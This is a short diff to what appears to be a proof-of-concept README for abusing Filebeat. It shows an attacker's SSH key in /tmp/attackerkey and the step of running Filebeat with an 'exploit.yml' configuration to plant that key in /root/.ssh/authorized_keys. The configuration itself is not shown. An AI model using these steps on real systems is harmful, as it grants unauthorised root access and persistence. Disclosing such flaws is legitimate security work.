@@ -16,8 +16,14 @@ $ cat /tmp/attackerkey
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDSNDOAMkNcqtwWnG[...]4Cn1s0XfNOEmXYQBPJUZN65kPL+oMNqRM2h1DfIEJY4g+RD/NMDffsEizLxdnlpf30LjZtQ== luigi@lt
 ```
  
-3) Run the follwowing command  sudo ./filebeat -c exploit.yml
-4) Enjoy your key added to /root/.ssh/authorized_keys
+3) Run the follwowing command
+
+```
+ ./filebeat -c exploit.yml
+ 
+```
+
+5) Enjoy your key added to /root/.ssh/authorized_keys
 
 
 
